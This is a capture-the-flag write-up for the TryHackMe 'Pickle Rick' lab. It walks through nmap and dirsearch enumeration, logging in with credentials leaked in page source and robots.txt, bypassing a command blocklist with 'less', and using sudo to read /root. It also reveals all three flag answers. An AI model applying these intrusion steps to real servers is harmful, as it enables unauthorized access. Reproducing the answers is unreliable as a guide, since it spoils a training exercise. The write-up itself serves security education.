---
tags: [tryhackme, exploit, easy]
categories: [tryhackme, exploit, easy]
icon: chevron-right
author: Ivo Muijtjens
date: 2022-05-29
---
![](/static/headers/pickle-rick.png)

# Pickle Rick

This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. As preparation for this room, I recommend following the Web Hacking Fundamentals path to get familair with the commands:

[!ref target="blank" text="How websites work" icon="../static/icons/websites.png"](https://tryhackme.com/room/howwebsiteswork)
[!ref target="blank" text="HTTP in detail" icon="../static/icons/http.png"](https://tryhackme.com/room/httpindetail)
[!ref target="blank" text="Burp Suite: The Basics" icon="../static/icons/burp.png"](https://tryhackme.com/room/burpsuitebasics)
[!ref target="blank" text="OWASP Top 10" icon="../static/icons/owasp.png"](https://tryhackme.com/room/owasptop10)
[!ref target="blank" text="OWASP Juice Shop" icon="../static/icons/juice.png"](https://tryhackme.com/room/owaspjuiceshop)
[!ref target="blank" text="Upload Vulnerabilities" icon="../static/icons/vulnerabilities.png"](https://tryhackme.com/room/uploadvulns)

---

# Writeup

### Enumeration

**What is the first ingredient Rick needs?**

First step is to start with enumeration. Let's start with a nmap scan on the IP-address of the webserver: `nmap -A 10.10.92.155 -Pn`.

    Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 06:11 EDT
    Nmap scan report for 10.10.92.155
    Host is up (0.035s latency).
    Not shown: 998 closed tcp ports (conn-refused)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 ea:6b:0c:04:ff:3b:ce:b6:53:30:83:5e:94:26:e3:30 (RSA)
    |   256 b8:cf:b9:98:7d:c5:10:62:e1:76:ea:fa:cc:d5:43:95 (ECDSA)
    |_  256 c1:8f:c0:60:46:f4:e9:72:fb:e8:5f:40:15:a6:eb:98 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Rick is sup4r cool
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds

The nmap scan gives us some information. There are 2 open ports: 22 (SSH) and 80 (HTTP). The webserver runs on Apache 2.4.18. Let's open the webpage in our browser to investigate it a little more.

![Homepage of the website](/static/images/website.png)

No useful data visible on the homepage. What if we view the page source?

![Page source of the website](/static/images/pagesource.png)

We see the developer made a HTML comment between the `<!-- -->` tags. Now we know the username, but how can we use it? The homepage looks like a static webpage without a login form. Let's dig in a little further.

    <!--

        Note to self, remember username!

        Username: R1ckRul3s

    -->

I've use the tool dirsearch to scan the webserver: `dirsearch -u http://10-10-92-155.p.thmlabs.com/`. The tool found some interesting files and directories to work with.

    [06:45:04] 200 -    2KB - /assets/
    [06:45:10] 200 -    1KB - /index.html                                       
    [06:45:12] 200 -  882B  - /login.php                                        
    [06:45:18] 200 -   17B  - /robots.txt

First thing I did was checking the files in the assets folder. It contains some images plus .css and .js files. I can't find something useful in here.

![Assets](/static/images/assets.png)

The `index.html` file is the default homepage. Next is a `login.php` file which is the most interesting file. Let's open this in our browser to see what is does:

![Portal login page](/static/images/login.png)

A login page that requires a username and password. We found out about the username, but we don't have a password. First of all, let's check the last file that we found with dirsearch: `robots.txt`. This file tells search engine crawlers which URL's it may access on a webserver. This file contains a weird word: `Wubbalubbadubdub`. Could this be our password? Let's try it out on the login page.

**Username:** R1ckRul3s

**Password:** Wubbalubbadubdub

We're in and have been redirected to `portal.php`. Type in `ls` to list all files and directories. I see 2 interesting files: `Sup3rS3cretPickl3Ingred.txt` and `clue.txt`.

![Command panel](/static/images/command.png)

Let's try the command `cat Sup3rS3cretPickl3Ingred.txt` to see if we can read the contents of the file. The command is disabled.

![Command disabled](/static/images/disabled.png)

We have another utility in Linux to read file contents, let's try the `less` command: `less Sup3rS3cretPickl3Ingred.txt`. That command isn't blocked. We found our first flag.

==- Reveal Flag 1
mr. meeseek hair
===

**Whats the second ingredient Rick needs?**

Remember there was a second file called `clue.txt`. Let's find out if it can lead us to other flags. Type in `less clue.txt`.

    Look around the file system for the other ingredient.

So we can find the other flags by looking around in the file system. First I'm gonna check if there is a home folder. To combine command I'm gonna use the `&&` operator, since the portal page changes back to the webroot after every executed command. The first command I used is `cd /home && ls`. The output shows me there are 2 homefolders:

    rick
    ubuntu

Let's check the contents of the folder `rick`. Change the command to `cd /home/rick && ls` and execute it. Cool, there is a file called `second ingredients`. Let's open it with the `less /home/rick/'second ingredients'` command. There is our second flag.

==- Reveal Flag 2
1 jerry tear
===

**Whats the final ingredient Rick needs?**

What other files can I find on the file system? Let's see if I'm able to run sudo with the command `sudo -l`.

    Matching Defaults entries for www-data on ip-10-10-92-155.eu-west-1.compute.internal:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on ip-10-10-92-155.eu-west-1.compute.internal:
        (ALL) NOPASSWD: ALL

Yes, I can. Now that I've confirmed I can run sudo, I'm able to access the root directory. I can list the contents with command `sudo ls -la /root`.

    total 28
    drwx------  4 root root 4096 Feb 10  2019 .
    drwxr-xr-x 23 root root 4096 May 29 10:10 ..
    -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
    -rw-r--r--  1 root root  148 Aug 17  2015 .profile
    drwx------  2 root root 4096 Feb 10  2019 .ssh
    -rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
    drwxr-xr-x  3 root root 4096 Feb 10  2019 snap

There is a file called `3rd.txt` that might be interesting. Let's read the contents with command `sudo less /root/3rd.txt`. This file contains our last flag.

==- Reveal Flag 3
fleeb juice
===

!!!success
Congratiulations, you've completed the room.
!!!